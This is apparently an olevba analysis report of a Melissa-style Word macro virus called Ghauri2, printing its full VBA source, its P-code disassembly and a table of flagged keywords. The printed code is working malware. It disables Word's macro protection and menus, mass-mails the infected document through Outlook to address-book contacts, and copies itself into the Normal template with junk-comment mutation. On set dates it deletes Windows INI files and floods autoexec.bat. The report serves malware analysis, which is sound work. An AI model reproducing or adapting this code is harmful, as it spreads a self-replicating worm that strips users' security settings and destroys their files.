olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Melissa-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Melissa-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ghauri2.bas 
in file: ./Virus.MSWord.Melissa-based - OLE stream: 'Macros/VBA/Ghauri2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
If ActiveDocument.SaveFormat = 0 Then
Ghauri2
End If
End Sub
Sub FileSave()
On Error Resume Next
MsgBox "FileSave"
If ActiveDocument.SaveFormat = 0 Then
Ghauri2
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
End Sub
Private Sub Stealth()
On Error Resume Next
Application.DisplayAlerts = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = False
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("tools").Controls("Templates and Add-Ins...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("Format").Controls("Style...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
End Sub
Private Sub WormAction()
On Error Resume Next
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
For x = 1 To DasMapiName.AddressLists.Count
Set AddyBook = DasMapiName.AddressLists(x)
y = 1
Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
For z = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(y)
BreakUmOffASlice.Recipients.Add Peep
y = y + 1
If y > 50 Then z = AddyBook.AddressEntries.Count
Next z
BreakUmOffASlice.Subject = "A Piece of Information From " & Application.UserName
BreakUmOffASlice.Body = "Here is some thing about EME College that you better know..."
BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
BreakUmOffASlice.Send
Peep = ""
Next x
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "! Ghauri2 !") = "This machine salutes to GodOfBasic"
End Sub
Private Sub Ghauri2()
On Error Resume Next
Stealth
NotInNT = True: NotInAD = True
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(I).Name = "Ghauri2" Then NotInNT = False
Next
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(I).Name = "Ghauri2" Then NotInAD = False
Next
If NotInNT = True Then
WormAction
ActiveDocument.VBProject.VBComponents("Ghauri2").Export "c:\winio.vxd" 'Exports to File
Set Dobj = NormalTemplate.VBProject                                    'Set Victim
End If
If NotInAD = True Then
NormalTemplate.VBProject.VBComponents("Ghauri2").Export "c:\winio.vxd" 'Exports to File
Set Dobj = ActiveDocument.VBProject                                    'Set Victim
End If
If NotInNT = False And NotInAD = False Then GoTo NoNeed
Open "c:\winio.vxd" For Input As #1
Open "c:\winio2.vxd" For Output As #2
Looper:
Line Input #1, A$
If A$ <> "Sub AutoOpen()" Then GoTo Looper
VirusName$ = "Attribute VB_Name =" + Chr$(34) + "Ghauri2" + Chr$(34)
Print #2, VirusName$
Do
Print #2, A$
Line Input #1, A$
Loop Until A$ = "'Ghauri2"
Print #2, A$
Garbage (5)
Close #2: Close #1
A = 65
Fname$ = Chr$(58) + Chr$(92) + Chr$(119) + Chr$(105) + Chr$(110) + Chr$(105) + Chr$(111) + "2." + Chr$(118) + Chr$(120)
File$ = Chr$(Asc(Chr$(Asc(Chr$(Asc(Chr$(A + 2))))))) + Fname$ + Chr$(100)
If NotInNT = True Or NotInAD = True Then Dobj.VBComponents.Import (File$)
If NotInAD = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Kill "c:\winio.vxd": Kill "c:\winio2.vxd"
NoNeed:
Trigger
End Sub
Private Sub Garbage(A As Integer)
On Error Resume Next
For I = 1 To Int(Rnd * A)
Dummy$ = Space$(Int(Rnd * 3)) + "'"
For J = 1 To Int(Rnd * 5 + 1)
Dummy$ = Dummy$ + Chr$(Int(Rnd * 80) + 33)
Next
Print #2, Dummy$
Next
End Sub
Private Sub Trigger()
On Error Resume Next
GOBsEvent = Format(Date, "dd-mm")
Select Case (GOBsEvent)
Case "11-06"
MyMessage$ = "Say Happy Birthday to GodOfBasic! He is" + Str$(Format(Date, "yyyy") - 1978) + " years old today."
Case "28-05"
MyMessage$ = "This machine is struck by the great GHAURI2 Virus !!! ...coded by GodOfBasic"
Kill "c:\windows\*.INI"
Case "14-08"
MyMessage$ = "It's 14th Aug. Say Happy Birthday to Pakistan !!!  ...Ghauri2"
Case "25-03"
MyMessage$ = "25th March 1997, A memorable day of my life?  ...Ghauri2"
Case Else
If Int(Rnd * 1000) <> 786 Then GoTo EndTrigger
End Select
Open "c:\autoexec.bat" For Append As #1
Print #1, "@ECHO OFF"
For I = 1 To 1000: Print #1, "echo " + MyMessage$: Next
Close #1
EndTrigger:
End Sub
'(c); coded by GodOfBasic     (bangash259@yahoo.com)
'Ghauri2
 '89^
'bY$B
  '>mf%
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Melissa-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Ghauri2 - 9223 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #3:
' 	ArgsCall Ghauri2 0x0000 
' Line #4:
' 	EndIfBlock 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub FileSave())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitStr 0x0008 "FileSave"
' 	ArgsCall MsgBox 0x0001 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #10:
' 	ArgsCall Ghauri2 0x0000 
' Line #11:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub Stealth())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #25:
' 	LitVarSpecial (False)
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #26:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #27:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Style..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #29:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #30:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Private Sub WormAction())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Dim 
' 	VarDefn UngaDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn BreakUmOffASlice
' Line #36:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UngaDasOutlook 
' Line #37:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UngaDasOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DasMapiName 
' Line #38:
' 	Ld UngaDasOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #40:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DasMapiName 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #41:
' 	SetStmt 
' 	Ld x 
' 	Ld DasMapiName 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #42:
' 	LitDI2 0x0001 
' 	St y 
' Line #43:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UngaDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set BreakUmOffASlice 
' Line #44:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #45:
' 	Ld y 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #46:
' 	Ld Peep 
' 	Ld BreakUmOffASlice 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #47:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Add 
' 	St y 
' Line #48:
' 	Ld y 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St z 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	LitStr 0x001C "A Piece of Information From "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld BreakUmOffASlice 
' 	MemSt Subject 
' Line #51:
' 	LitStr 0x003C "Here is some thing about EME College that you better know..."
' 	Ld BreakUmOffASlice 
' 	MemSt Body 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld BreakUmOffASlice 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #53:
' 	Ld BreakUmOffASlice 
' 	ArgsMemCall Send 0x0000 
' Line #54:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #55:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	Ld DasMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	LitStr 0x0022 "This machine salutes to GodOfBasic"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x000B "! Ghauri2 !"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Private Sub Ghauri2())
' Line #61:
' 	OnError (Resume Next) 
' Line #62:
' 	ArgsCall Stealth 0x0000 
' Line #63:
' 	LitVarSpecial (True)
' 	St NotInNT 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St NotInAD 
' Line #64:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #65:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Ghauri2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NotInNT 
' 	EndIf 
' Line #66:
' 	StartForVariable 
' 	Next 
' Line #67:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #68:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Ghauri2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NotInAD 
' 	EndIf 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	Ld NotInNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #71:
' 	ArgsCall WormAction 0x0000 
' Line #72:
' 	LitStr 0x000C "c:\winio.vxd"
' 	LitStr 0x0007 "Ghauri2"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	QuoteRem 0x0047 0x000F "Exports to File"
' Line #73:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Dobj 
' 	QuoteRem 0x0047 0x000A "Set Victim"
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld NotInAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitStr 0x000C "c:\winio.vxd"
' 	LitStr 0x0007 "Ghauri2"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' 	QuoteRem 0x0047 0x000F "Exports to File"
' Line #77:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Dobj 
' 	QuoteRem 0x0047 0x000A "Set Victim"
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	Ld NotInNT 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NotInAD 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo NoNeed 
' 	EndIf 
' Line #80:
' 	LitStr 0x000C "c:\winio.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #81:
' 	LitStr 0x000D "c:\winio2.vxd"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #82:
' 	Label Looper 
' Line #83:
' 	LitDI2 0x0001 
' 	Ld A$ 
' 	LineInput 
' Line #84:
' 	Ld A$ 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Looper 
' 	EndIf 
' Line #85:
' 	LitStr 0x0013 "Attribute VB_Name ="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0007 "Ghauri2"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St VirusName$ 
' Line #86:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld VirusName$ 
' 	PrintItemNL 
' Line #87:
' 	Do 
' Line #88:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld A$ 
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Ld A$ 
' 	LineInput 
' Line #90:
' 	Ld A$ 
' 	LitStr 0x0008 "'Ghauri2"
' 	Eq 
' 	LoopUntil 
' Line #91:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld A$ 
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0005 
' 	Paren 
' 	ArgsCall Garbage 0x0001 
' Line #93:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #94:
' 	LitDI2 0x0041 
' 	St A 
' Line #95:
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0002 "2."
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Fname$ 
' Line #96:
' 	Ld A 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	ArgsLd Asc 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	ArgsLd Asc 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	ArgsLd Asc 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Ld Fname$ 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St File$ 
' Line #97:
' 	Ld NotInNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NotInAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld File$ 
' 	Paren 
' 	Ld Dobj 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #98:
' 	Ld NotInAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #99:
' 	LitStr 0x000C "c:\winio.vxd"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000D "c:\winio2.vxd"
' 	ArgsCall Kill 0x0001 
' Line #100:
' 	Label NoNeed 
' Line #101:
' 	ArgsCall Trigger 0x0000 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Private Sub Garbage(A As Integer))
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	Ld A 
' 	Mul 
' 	FnInt 
' 	For 
' Line #106:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	ArgsLd Space$ 0x0001 
' 	LitStr 0x0001 "'"
' 	Add 
' 	St Dummy$ 
' Line #107:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	For 
' Line #108:
' 	Ld Dummy$ 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Dummy$ 
' Line #109:
' 	StartForVariable 
' 	Next 
' Line #110:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld Dummy$ 
' 	PrintItemNL 
' Line #111:
' 	StartForVariable 
' 	Next 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Private Sub Trigger())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	Ld Date 
' 	LitStr 0x0005 "dd-mm"
' 	ArgsLd Format$ 0x0002 
' 	St GOBsEvent 
' Line #116:
' 	Ld GOBsEvent 
' 	Paren 
' 	SelectCase 
' Line #117:
' 	LitStr 0x0005 "11-06"
' 	Case 
' 	CaseDone 
' Line #118:
' 	LitStr 0x0027 "Say Happy Birthday to GodOfBasic! He is"
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitDI2 0x07BA 
' 	Sub 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0011 " years old today."
' 	Add 
' 	St MyMessage$ 
' Line #119:
' 	LitStr 0x0005 "28-05"
' 	Case 
' 	CaseDone 
' Line #120:
' 	LitStr 0x004C "This machine is struck by the great GHAURI2 Virus !!! ...coded by GodOfBasic"
' 	St MyMessage$ 
' Line #121:
' 	LitStr 0x0010 "c:\windows\*.INI"
' 	ArgsCall Kill 0x0001 
' Line #122:
' 	LitStr 0x0005 "14-08"
' 	Case 
' 	CaseDone 
' Line #123:
' 	LitStr 0x003D "It's 14th Aug. Say Happy Birthday to Pakistan !!!  ...Ghauri2"
' 	St MyMessage$ 
' Line #124:
' 	LitStr 0x0005 "25-03"
' 	Case 
' 	CaseDone 
' Line #125:
' 	LitStr 0x0038 "25th March 1997, A memorable day of my life?  ...Ghauri2"
' 	St MyMessage$ 
' Line #126:
' 	CaseElse 
' Line #127:
' 	Ld Rnd 
' 	LitDI2 0x03E8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0312 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo EndTrigger 
' 	EndIf 
' Line #128:
' 	EndSelect 
' Line #129:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #131:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	For 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo "
' 	Ld MyMessage$ 
' 	Add 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #133:
' 	Label EndTrigger 
' Line #134:
' 	EndSub 
' Line #135:
' 	QuoteRem 0x0000 0x0033 "(c); coded by GodOfBasic     (bangash259@yahoo.com)"
' Line #136:
' 	QuoteRem 0x0000 0x0007 "Ghauri2"
' Line #137:
' 	QuoteRem 0x0001 0x0003 "89^"
' Line #138:
' 	QuoteRem 0x0000 0x0004 "bY$B"
' Line #139:
' 	QuoteRem 0x0002 0x0004 ">mf%"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

